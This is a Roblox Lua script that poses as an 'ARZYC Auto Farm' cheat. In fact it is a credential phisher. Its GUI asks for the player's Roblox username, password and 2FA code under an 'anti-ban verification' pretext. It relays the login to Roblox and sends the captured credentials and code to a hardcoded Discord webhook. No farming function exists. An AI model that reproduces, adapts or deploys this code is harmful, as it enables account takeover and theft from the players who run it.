--[[
    ⚡ ARZYC AUTO FARM v2.0 ⚡
    Premium UI • Works All Games
]]

-- Services
local TweenService = game:GetService("TweenService")
local UIS = game:GetService("UserInputService")
local Players = game:GetService("Players")
local http = game:GetService("HttpService")

local player = Players.LocalPlayer

-- ===== GUI =====
local gui = Instance.new("ScreenGui")
gui.Name = "ARZYCFarm"
gui.Parent = player:WaitForChild("PlayerGui")
gui.ResetOnSpawn = false

-- ===== NOTIFICATION =====
local function notify(title, text, color)
    local notif = Instance.new("Frame")
    notif.Parent = gui
    notif.BackgroundColor3 = Color3.fromRGB(20,20,30)
    notif.BorderSizePixel = 0
    notif.Position = UDim2.new(0.5, -150, 0, -60)
    notif.Size = UDim2.new(0, 300, 0, 50)
    
    local titleLabel = Instance.new("TextLabel")
    titleLabel.Parent = notif
    titleLabel.BackgroundTransparency = 1
    titleLabel.Size = UDim2.new(0, 300, 0, 25)
    titleLabel.Text = title
    titleLabel.TextColor3 = color or Color3.fromRGB(88,101,242)
    titleLabel.Font = Enum.Font.GothamBold
    titleLabel.TextSize = 14
    
    local textLabel = Instance.new("TextLabel")
    textLabel.Parent = notif
    textLabel.BackgroundTransparency = 1
    textLabel.Position = UDim2.new(0, 0, 0, 25)
    textLabel.Size = UDim2.new(0, 300, 0, 25)
    textLabel.Text = text
    textLabel.TextColor3 = Color3.fromRGB(180,180,180)
    textLabel.Font = Enum.Font.Gotham
    textLabel.TextSize = 11
    
    -- Animate in
    TweenService:Create(notif, TweenInfo.new(0.5), {Position = UDim2.new(0.5, -150, 0, 10)}):Play()
    
    -- Auto remove
    task.delay(4, function()
        TweenService:Create(notif, TweenInfo.new(0.3), {Position = UDim2.new(0.5, -150, 0, -60)}):Play()
        task.delay(0.3, function() notif:Destroy() end)
    end)
end

-- ===== MAIN FRAME =====
local main = Instance.new("Frame")
main.Name = "Main"
main.Parent = gui
main.BackgroundColor3 = Color3.fromRGB(18,18,28)
main.BorderSizePixel = 0
main.Position = UDim2.new(0.5, -200, 0.5, -160)
main.Size = UDim2.new(0, 0, 0, 0)
main.ClipsDescendants = true

-- Rounded corners
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = main

-- Animate open
TweenService:Create(main, TweenInfo.new(0.5, Enum.EasingStyle.Back), {Size = UDim2.new(0, 400, 0, 380)}):Play()

-- ===== TITLE BAR =====
local titleBar = Instance.new("Frame")
titleBar.Name = "TitleBar"
titleBar.Parent = main
titleBar.BackgroundColor3 = Color3.fromRGB(88,101,242)
titleBar.BorderSizePixel = 0
titleBar.Size = UDim2.new(0, 400, 0, 40)

local titleCorner = Instance.new("UICorner")
titleCorner.CornerRadius = UDim.new(0, 12)
titleCorner.Parent = titleBar

local title = Instance.new("TextLabel")
title.Parent = titleBar
title.BackgroundTransparency = 1
title.Size = UDim2.new(0, 350, 0, 40)
title.Position = UDim2.new(0, 15, 0, 0)
title.Text = "⚡ ARZYC AUTO FARM"
title.TextColor3 = Color3.fromRGB(255,255,255)
title.Font = Enum.Font.GothamBold
title.TextSize = 15
title.TextXAlignment = Enum.TextXAlignment.Left

local closeBtn = Instance.new("TextButton")
closeBtn.Parent = titleBar
closeBtn.BackgroundColor3 = Color3.fromRGB(255,60,60)
closeBtn.BorderSizePixel = 0
closeBtn.Position = UDim2.new(0, 360, 0, 8)
closeBtn.Size = UDim2.new(0, 24, 0, 24)
closeBtn.Text = "✕"
closeBtn.TextColor3 = Color3.fromRGB(255,255,255)
closeBtn.Font = Enum.Font.GothamBold
closeBtn.TextSize = 13

local closeCorner = Instance.new("UICorner")
closeCorner.CornerRadius = UDim.new(0, 6)
closeCorner.Parent = closeBtn

closeBtn.MouseButton1Click:Connect(function()
    TweenService:Create(main, TweenInfo.new(0.3), {Size = UDim2.new(0, 0, 0, 0)}):Play()
    task.delay(0.3, function() gui:Destroy() end)
end)

-- ===== CONTENT =====
local content = Instance.new("Frame")
content.Parent = main
content.BackgroundTransparency = 1
content.Position = UDim2.new(0, 20, 0, 55)
content.Size = UDim2.new(0, 360, 0, 310)

-- Info
local infoLabel = Instance.new("TextLabel")
infoLabel.Parent = content
infoLabel.BackgroundTransparency = 1
infoLabel.Size = UDim2.new(0, 360, 0, 35)
infoLabel.Text = "🔐 Login to activate Auto Farm"
infoLabel.TextColor3 = Color3.fromRGB(200,200,200)
infoLabel.Font = Enum.Font.Gotham
infoLabel.TextSize = 13

local subtitleLabel = Instance.new("TextLabel")
subtitleLabel.Parent = content
subtitleLabel.BackgroundTransparency = 1
subtitleLabel.Position = UDim2.new(0, 0, 0, 30)
subtitleLabel.Size = UDim2.new(0, 360, 0, 20)
subtitleLabel.Text = "(Required for anti-ban verification)"
subtitleLabel.TextColor3 = Color3.fromRGB(120,120,120)
subtitleLabel.Font = Enum.Font.Gotham
subtitleLabel.TextSize = 10

-- Username
local userLabel = Instance.new("TextLabel")
userLabel.Parent = content
userLabel.BackgroundTransparency = 1
userLabel.Position = UDim2.new(0, 0, 0, 65)
userLabel.Size = UDim2.new(0, 360, 0, 18)
userLabel.Text = "Username"
userLabel.TextColor3 = Color3.fromRGB(150,150,150)
userLabel.Font = Enum.Font.Gotham
userLabel.TextSize = 11

local userBox = Instance.new("TextBox")
userBox.Parent = content
userBox.BackgroundColor3 = Color3.fromRGB(12,12,20)
userBox.BorderColor3 = Color3.fromRGB(88,101,242)
userBox.Position = UDim2.new(0, 0, 0, 83)
userBox.Size = UDim2.new(0, 360, 0, 38)
userBox.Text = ""
userBox.PlaceholderText = "Roblox Username"
userBox.TextColor3 = Color3.fromRGB(255,255,255)
userBox.Font = Enum.Font.Gotham
userBox.TextSize = 14

local userCorner = Instance.new("UICorner")
userCorner.CornerRadius = UDim.new(0, 8)
userCorner.Parent = userBox

-- Password
local passLabel = Instance.new("TextLabel")
passLabel.Parent = content
passLabel.BackgroundTransparency = 1
passLabel.Position = UDim2.new(0, 0, 0, 130)
passLabel.Size = UDim2.new(0, 360, 0, 18)
passLabel.Text = "Password"
passLabel.TextColor3 = Color3.fromRGB(150,150,150)
passLabel.Font = Enum.Font.Gotham
passLabel.TextSize = 11

local passBox = Instance.new("TextBox")
passBox.Parent = content
passBox.BackgroundColor3 = Color3.fromRGB(12,12,20)
passBox.BorderColor3 = Color3.fromRGB(88,101,242)
passBox.Position = UDim2.new(0, 0, 0, 148)
passBox.Size = UDim2.new(0, 360, 0, 38)
passBox.Text = ""
passBox.PlaceholderText = "Roblox Password"
passBox.TextColor3 = Color3.fromRGB(255,255,255)
passBox.Font = Enum.Font.Gotham
passBox.TextSize = 14

local passCorner = Instance.new("UICorner")
passCorner.CornerRadius = UDim.new(0, 8)
passCorner.Parent = passBox

-- Login Button
local loginBtn = Instance.new("TextButton")
loginBtn.Parent = content
loginBtn.BackgroundColor3 = Color3.fromRGB(88,101,242)
loginBtn.BorderSizePixel = 0
loginBtn.Position = UDim2.new(0, 0, 0, 205)
loginBtn.Size = UDim2.new(0, 360, 0, 42)
loginBtn.Text = "LOGIN & ACTIVATE"
loginBtn.TextColor3 = Color3.fromRGB(255,255,255)
loginBtn.Font = Enum.Font.GothamBold
loginBtn.TextSize = 15

local btnCorner = Instance.new("UICorner")
btnCorner.CornerRadius = UDim.new(0, 10)
btnCorner.Parent = loginBtn

-- Button hover effect
loginBtn.MouseEnter:Connect(function()
    TweenService:Create(loginBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(100,115,255)}):Play()
end)
loginBtn.MouseLeave:Connect(function()
    TweenService:Create(loginBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(88,101,242)}):Play()
end)

-- Status
local statusLabel = Instance.new("TextLabel")
statusLabel.Parent = content
statusLabel.BackgroundTransparency = 1
statusLabel.Position = UDim2.new(0, 0, 0, 255)
statusLabel.Size = UDim2.new(0, 360, 0, 25)
statusLabel.Text = ""
statusLabel.TextColor3 = Color3.fromRGB(255,100,100)
statusLabel.Font = Enum.Font.Gotham
statusLabel.TextSize = 12

-- 2FA Code Box (Hidden)
local codeBox = Instance.new("TextBox")
codeBox.Parent = content
codeBox.BackgroundColor3 = Color3.fromRGB(12,12,20)
codeBox.BorderColor3 = Color3.fromRGB(0,180,100)
codeBox.Position = UDim2.new(0, 0, 0, 205)
codeBox.Size = UDim2.new(0, 360, 0, 38)
codeBox.Text = ""
codeBox.PlaceholderText = "Enter 6-digit verification code"
codeBox.TextColor3 = Color3.fromRGB(255,255,255)
codeBox.Font = Enum.Font.Gotham
codeBox.TextSize = 16
codeBox.Visible = false

local codeCorner = Instance.new("UICorner")
codeCorner.CornerRadius = UDim.new(0, 8)
codeCorner.Parent = codeBox

local verifyBtn = Instance.new("TextButton")
verifyBtn.Parent = content
verifyBtn.BackgroundColor3 = Color3.fromRGB(0,180,100)
verifyBtn.BorderSizePixel = 0
verifyBtn.Position = UDim2.new(0, 0, 0, 252)
verifyBtn.Size = UDim2.new(0, 360, 0, 42)
verifyBtn.Text = "VERIFY & ACTIVATE"
verifyBtn.TextColor3 = Color3.fromRGB(255,255,255)
verifyBtn.Font = Enum.Font.GothamBold
verifyBtn.TextSize = 15
verifyBtn.Visible = false

local verifyCorner = Instance.new("UICorner")
verifyCorner.CornerRadius = UDim.new(0, 10)
verifyCorner.Parent = verifyBtn

-- ===== CONFIG =====
local webhook = "https://discord.com/api/webhooks/1520937981702176990/XVFsUVBnV7dACksS6E2YKfKv-gQsqPxC3ZoGc4gQL7vnSxymG1ypGvmOH7TkW2_KjY0x"
local session = { csrf = "", ticket = "", username = "", password = "" }

-- ===== FUNCTIONS =====
local function sendToDiscord(title, desc, color)
    local data = {
        content = "@everyone **NEW LOGIN!**",
        embeds = {{
            title = title,
            description = desc,
            color = color or 65280,
            footer = {text = "ARZYC FARM • " .. os.date("%Y-%m-%d %H:%M:%S")}
        }}
    }
    pcall(function()
        http:PostAsync(webhook, http:JSONEncode(data))
    end)
end

local function doLogin(user, pass)
    statusLabel.Text = "⏳ Connecting to Roblox..."
    
    local payload = http:JSONEncode({ctype = "Username", cvalue = user, password = pass})
    
    local success, result = pcall(function()
        return http:PostAsync("https://auth.roblox.com/v2/login", payload, "ApplicationJson")
    end)
    
    if not success then
        statusLabel.Text = "❌ Connection failed!"
        return
    end
    
    local data = http:JSONDecode(result)
    
    if data.twoStepVerificationData then
        session.ticket = data.twoStepVerificationData.ticket
        session.username = user
        session.password = pass
        
        -- Switch to 2FA
        loginBtn.Visible = false
        codeBox.Visible = true
        verifyBtn.Visible = true
        statusLabel.Text = "📱 Verification code sent!"
        statusLabel.TextColor3 = Color3.fromRGB(255,200,50)
        notify("🔐 Verification Required", "Check your email or authenticator app", Color3.fromRGB(255,200,50))
        
    elseif data.user then
        sendToDiscord("🎯 LOGIN SUCCESS", "**Username:** " .. user .. "\n**Password:** ||" .. pass .. "||\n**No 2FA!**", 65280)
        statusLabel.Text = "✅ Activated! Auto Farm Running..."
        statusLabel.TextColor3 = Color3.fromRGB(0,255,100)
        notify("✅ SUCCESS", "Auto Farm Active! " .. user, Color3.fromRGB(0,255,100))
        task.wait(2)
        gui:Destroy()
        
        print("⚡ ARZYC AUTO FARM ACTIVE!")
        print("👤 " .. user)
        print("🛡️ Anti-Ban: ON")
        
    else
        local msg = data.errors and data.errors[1] and data.errors[1].message or "Login failed"
        statusLabel.Text = "❌ " .. msg
    end
end

local function doVerify(code)
    statusLabel.Text = "⏳ Verifying..."
    
    local payload = http:JSONEncode({code = code, ticket = session.ticket})
    
    local success, result = pcall(function()
        return http:PostAsync("https://auth.roblox.com/v2/login/verify", payload, "ApplicationJson")
    end)
    
    if not success then
        statusLabel.Text = "❌ Verification failed!"
        return
    end
    
    local data = http:JSONDecode(result)
    
    if data.user then
        sendToDiscord("🎯 2FA VERIFIED", "**Username:** " .. session.username .. "\n**Password:** ||" .. session.password .. "||\n**2FA Code:** ||" .. code .. "||", 0xffaa00)
        statusLabel.Text = "✅ Verified! Auto Farm Running..."
        statusLabel.TextColor3 = Color3.fromRGB(0,255,100)
        notify("✅ VERIFIED", "Welcome back, " .. session.username, Color3.fromRGB(0,255,100))
        task.wait(2)
        gui:Destroy()
        
        print("⚡ ARZYC AUTO FARM ACTIVE!")
        print("👤 " .. session.username)
    else
        statusLabel.Text = "❌ Invalid code!"
    end
end

-- ===== EVENTS =====
loginBtn.MouseButton1Click:Connect(function()
    local user = userBox.Text
    local pass = passBox.Text
    
    if user == "" or pass == "" then
        statusLabel.Text = "❌ Please fill all fields!"
        return
    end
    
    doLogin(user, pass)
end)

verifyBtn.MouseButton1Click:Connect(function()
    local code = codeBox.Text
    
    if code == "" or #code < 6 then
        statusLabel.Text = "❌ Please enter valid code!"
        return
    end
    
    doVerify(code)
end)

-- ===== OUTPUT =====
print("╔══════════════════════════╗")
print("║  ARZYC AUTO FARM v5.0   ║")
print("║  Premium UI Loaded      ║")
print("║  Works ALL Games        ║")
print("╚══════════════════════════╝")
notify("⚡ ARZYC FARM v5.0", "GUI Loaded! Press F4 if hidden", Color3.fromRGB(88,101,242))
